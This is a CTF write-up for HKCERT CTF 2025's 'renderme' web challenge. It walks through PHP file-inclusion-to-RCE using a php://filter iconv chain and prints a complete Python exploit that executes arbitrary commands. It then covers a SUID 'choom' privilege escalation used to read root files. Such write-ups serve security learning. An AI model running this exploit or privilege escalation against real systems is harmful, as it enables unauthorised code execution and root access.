---
title: "HKCERT CTF 2025 Writeup"
description: "My HKCERT CTF 2025 writeup collection, starting with the renderme web exploitation challenge."
date: 2026-03-17T00:40:00+0800
lastmod: 2026-05-17T23:05:04+0800
tag: "CTF, HKCERT CTF, Web Exploitation"
lang: en-US
---

## Introduction

This page is for my HKCERT CTF 2025 writeups. Right now I only have time to write up `renderme` first, and I will add the other challenges later when I cleanup my PC file ... XDD

~~呢條友好懶,完左咁耐都未寫返篇 writeup 出黎~~

## renderme

`renderme` is a very fun Web Exploitation challenge because it is not just one single trick. You need to first get code execution, then calm down and enumerate the machine properly, and only then do the privilege escalation.

### Challenge Overview

The goal of this challenge was straightforward: get RCE on the target, escalate privileges, and read the root flag.

After looking at the application behavior for a bit, it was pretty clear that user-controlled input was reaching a file inclusion sink. Once I saw that, my first thought was immediately `php://filter`, because this kind of bug often turns into LFI-to-RCE if the backend uses `include` or `require` carelessly.

### Initial Access - PHP Filter Chain RCE

The main bug here was that we could control data that eventually ended up inside a PHP file inclusion path. Instead of going down the usual path like log poisoning or upload tricks, I decided to use the PHP filter chain technique.

The theory is simple, but the actual payload is super ugly:

1. Start from a valid file that the target can include.
2. Wrap it with `php://filter`.
3. Use a long chain of `convert.iconv.*` filters to shape the byte stream.
4. Build a base64-encoded PHP payload in memory.
5. Decode it back into executable PHP before the final include happens.

In this case, the small stager I used was:

```php
<?=require$_POST[1]?>
```

I like this kind of stager because the first payload stays very small, while the actual second-stage payload can be sent later through `$_POST[1]`.

That is very useful when the injection point is annoying, filtered, or has length restrictions.

Of course, I did not generate the filter chain by hand. That would be painful. I used a helper script to automate the generation and get an interactive shell.

(https://github.com/synacktiv/php_filter_chain_generator)

```python
import base64
import sys

import requests

file_to_use = 'php://temp'

conversions = {
    '0': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2',
    '1': 'convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4',
    '2': 'convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921',
    '3': 'convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE',
    '4': 'convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE',
    '5': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.8859_3.UCS2',
    '6': 'convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.CSIBM943.UCS4|convert.iconv.IBM866.UCS-2',
    '7': 'convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO-IR-103.850|convert.iconv.PT154.UCS4',
    '8': 'convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2',
    '9': 'convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB',
    'A': 'convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213',
    'a': 'convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE',
    'B': 'convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000',
    'b': 'convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE',
    'C': 'convert.iconv.UTF8.CSISO2022KR',
    'c': 'convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2',
    'D': 'convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213',
    'd': 'convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5',
    'E': 'convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT',
    'e': 'convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UTF16.EUC-JP-MS|convert.iconv.ISO-8859-1.ISO_6937',
    'F': 'convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB',
    'f': 'convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213',
    'g': 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8',
    'G': 'convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90',
    'H': 'convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213',
    'h': 'convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE',
    'I': 'convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213',
    'i': 'convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000',
    'J': 'convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4',
    'j': 'convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16',
    'K': 'convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE',
    'k': 'convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2',
    'L': 'convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC',
    'l': 'convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE',
    'M': 'convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T',
    'm': 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949',
    'N': 'convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4',
    'n': 'convert.iconv.ISO88594.UTF16|convert.iconv.IBM5347.UCS4|convert.iconv.UTF32BE.MS936|convert.iconv.OSF00010004.T.61',
    'O': 'convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775',
    'o': 'convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE',
    'P': 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB',
    'p': 'convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4',
    'q': 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.GBK.CP932|convert.iconv.BIG5.UCS2',
    'Q': 'convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2',
    'R': 'convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4',
    'r': 'convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.ISO-IR-99.UCS-2BE|convert.iconv.L4.OSF00010101',
    'S': 'convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS',
    's': 'convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90',
    'T': 'convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103',
    't': 'convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS',
    'U': 'convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943',
    'u': 'convert.iconv.CP1162.UTF32|convert.iconv.L4.T.61',
    'V': 'convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB',
    'v': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.ISO-8859-14.UCS2',
    'W': 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936',
    'w': 'convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE',
    'X': 'convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932',
    'x': 'convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS',
    'Y': 'convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361',
    'y': 'convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT',
    'Z': 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16',
    'z': 'convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937',
    '/': 'convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4',
    '+': 'convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157',
    '=': '',
}

def generate_filter_chain(chain, debug_base64=False):
    encoded_chain = chain
    filters = 'convert.iconv.UTF8.CSISO2022KR|'
    filters += 'convert.base64-encode|'
    filters += 'convert.iconv.UTF8.UTF7|'
    for c in encoded_chain[::-1]:
        filters += conversions[c] + '|'
        filters += 'convert.base64-decode|'
        filters += 'convert.base64-encode|'
        filters += 'convert.iconv.UTF8.UTF7|'
    if not debug_base64:
        filters += 'convert.base64-decode'
    return f'php://filter/{filters}/resource={file_to_use}'

url = 'http://web-9a4ea3c259.challenge.xctf.org.cn/'

def execute_command(cmd, cwd=None):
    real_cmd = f'cd {cwd} && {cmd}' if cwd else cmd
    real_cmd = real_cmd.replace("'", "\\'")
    php_code = f"<?php echo 'RCE_START'; system('{real_cmd}'); echo 'RCE_END'; ?>"
    b64_code = base64.b64encode(php_code.encode('utf-8')).decode('utf-8').replace('=', '')
    payload = generate_filter_chain(b64_code)
    data = {
        'name': '<?=require$_POST[1]?>',
        '1': payload,
    }
    try:
        response = requests.post(url, data=data)
        if 'RCE_START' in response.text:
            return response.text.split('RCE_START')[1].split('RCE_END')[0]
        return f'[-] RCE failed. Response len: {len(response.text)}'
    except Exception as e:
        return f'[-] Error: {e}'

def main():
    if len(sys.argv) < 2:
        print('Usage: python3 exploit_rce_cmd.py <command>')
        sys.exit(1)
    cmd = ' '.join(sys.argv[1:])
    print(f'[+] Executing: {cmd}')
    print(execute_command(cmd))

if __name__ == '__main__':
    main()
```

### Shell Access and Enumeration

After the payload landed properly, I got code execution as `www-data`.

Basic enumeration showed:

- Debian GNU/Linux 13 (`trixie`)
- user: `www-data`
- host kernel exposed as `4.18.0-240.el8.x86_64`
- the target was running inside a Docker-like containerized environment

That last point matters a lot. A kernel version might look old and juicy at first glance, but once Docker or some containerized environment gets involved, a lot of public kernel privesc ideas become a waste of time.

### Privilege Escalation

At this stage I just did the usual thing, enumerate first, then decide what looks realistic.

#### Failed Attempts

Since the host kernel looked relatively old, I did try a few known kernel privesc directions first. None of them worked.

Looking back, that was not very surprising:

- the environment was containerized
- required kernel features were likely unavailable
- the kernel might already have had the relevant fixes

I also ran the normal enumeration flow to check writable paths, services, sudo rules, and other common misconfigurations.

#### PrivEsc - SUID `choom`

The actual breakthrough came from enumerating SUID binaries:

```bash
find / -perm -4000 2>/dev/null
```

One binary stood out:

```bash
/usr/bin/choom
```

`choom` is normally just a utility for adjusting the OOM killer score of a process. But once it is exposed as a SUID root binary and does not drop privileges properly, it turns into a very nice privesc vector.

This is a known GTFOBins trick, so after spotting it, the path was basically clear.

So instead of wasting more time on kernel stuff, I just used it directly:

```bash
/usr/bin/choom -n 0 -- cat /root/flag
```

That was enough to read the root flag and finish the challenge cleanly.

```text
flag{T4x3EMg2KD6J3VfCPvOiDqF17ntodEsU}
```

### Final Thoughts

What I liked about this challenge is that it did not stop at one clever web trick. It forced a full chain:

- identify the PHP inclusion weakness
- turn it into RCE with the filter-chain technique
- do realistic post-exploitation enumeration
- avoid tunnel vision on kernel exploits
- notice the much simpler SUID privesc route

The main lesson here is the same as always, after getting a shell, do not rush blindly into fancy exploits. Slow down, enumerate properly, and look for the boring stuff too. A lot of the time, the intended privesc is much simpler than the one you are trying to force.

我幾鐘意呢類 RCE 類別既, 因為我 Prefer HackTheBox/TryHackMe 類既 hack 機拎 shell 題目 ... :)

### Reference

- [GTFOBins - choom](https://gtfobins.github.io/gtfobins/choom/#suid)
- [Synacktiv - PHP filters chain](https://www.synacktiv.com/en/publications/php-filters-chain-what-is-it-and-how-to-use-it)
